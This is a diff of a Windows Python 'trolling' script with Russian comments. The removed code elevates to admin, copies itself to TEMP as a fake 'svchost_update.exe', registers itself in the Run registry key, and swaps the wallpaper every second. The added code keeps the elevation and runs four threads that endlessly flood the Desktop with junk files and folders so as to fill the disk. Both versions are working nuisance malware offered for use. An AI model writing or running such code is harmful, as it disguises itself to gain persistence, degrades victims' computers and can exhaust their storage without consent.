@@ -3,11 +3,11 @@ import sys
 import time
 import ctypes
 import random
-import urllib.request
-import winreg
+import string
+import threading
 
 # ==========================================
-# ЧАСТЬ 1: ПРОВЕРКА ПРАВ И УСТАНОВКА
+# ЧАСТЬ 1: ПРОВЕРКА ПРАВ
 # ==========================================
 
 def is_admin():
@@ -22,46 +22,45 @@ def run_as_admin():
         sys.exit()
 
 # ==========================================
-# ЧАСТЬ 2: АВТОЗАГРУЗКА (PERSISTENCE)
+# ЧАСТЬ 2: ГЕНЕРАТОР МУСОРА
 # ==========================================
 
-def establish_persistence():
-    try:
-        # Копируемся в папку Temp
-        temp_dir = os.getenv("TEMP")
-        new_path = os.path.join(temp_dir, "svchost_update.exe")
-        if sys.executable != new_path:
-            import shutil
-            shutil.copy2(sys.executable, new_path)
-            
-        # Прописываем в реестр
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "WallpaperTroll", 0, winreg.REG_SZ, new_path)
-        winreg.CloseKey(key)
-    except:
-        pass
-
-# ==========================================
-# ЧАСТЬ 3: СМЕНА ОБОЕВ (ТРОЛЛИНГ)
-# ==========================================
-
-def change_wallpaper():
-    # Список случайных картинок (или можно генерировать локально)
-    # Используем сервис picsum.photos для случайных картинок
-    url = "https://picsum.photos/1920/1080?random=" + str(random.randint(1, 10000))
-    wallpaper_path = os.getenv("TEMP") + "\\wallpaper.jpg"
+def generate_trash():
+    # Путь к рабочему столу (учитываем разных пользователей)
+    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    if not os.path.exists(desktop_path):
+        desktop_path = os.path.join(os.getenv("USERPROFILE"), "Desktop")
     
-    try:
-        # Скачиваем картинку
-        urllib.request.urlretrieve(url, wallpaper_path)
-        
-        # Меняем обои через системный API
-        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
-    except:
-        pass
+    if not os.path.exists(desktop_path):
+        return # Если даже рабочего стола нет, сваливаем
+
+    # Бесконечный цикл создания мусора
+    while True:
+        try:
+            # Рандомное имя
+            name = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
+            
+            # 50% шанс создать файл, 50% - папку
+            if random.choice([True, False]):
+                # Создаем файл с мусором
+                file_path = os.path.join(desktop_path, f"TRASH_{name}.txt")
+                with open(file_path, "w", encoding="utf-8") as f:
+                    f.write("I AM BLUETOOTH. I DESTROYED YOUR PC. HAHAHAHA >:D\n")
+                    f.write("THIS FILE IS USELESS. DELETE IT.\n")
+                    f.write("M" * random.randint(1000, 5000)) # Забиваем мусором
+            else:
+                # Создаем пустую папку
+                folder_path = os.path.join(desktop_path, f"FOLDER_{name}")
+                os.makedirs(folder_path, exist_ok=True)
+            
+            # Задержка (чтобы комп не завис моментально, а то неинтересно)
+            time.sleep(0.05) 
+            
+        except Exception:
+            pass # Если диск переполнился или ошибка прав - идем дальше
 
 # ==========================================
-# ЧАСТЬ 4: ГЛАВНЫЙ ЦИКЛ
+# ЧАСТЬ 3: ЗАПУСК
 # ==========================================
 
 def main():
@@ -69,16 +68,13 @@ def main():
         run_as_admin()
         return
 
-    # Устанавливаем автозагрузку
-    establish_persistence()
-
-    # Бесконечный цикл смены обоев
+    # Запускаем создание мусора в 4 потока, чтобы завалить диск быстрее
+    for _ in range(4):
+        threading.Thread(target=generate_trash, daemon=True).start()
+    
+    # Держим скрипт активным (или создаем видимость работы)
     while True:
-        try:
-            change_wallpaper()
-            time.sleep(1) # Меняем каждую секунду
-        except:
-            pass
+        time.sleep(1)
 
 if __name__ == "__main__":
     main()
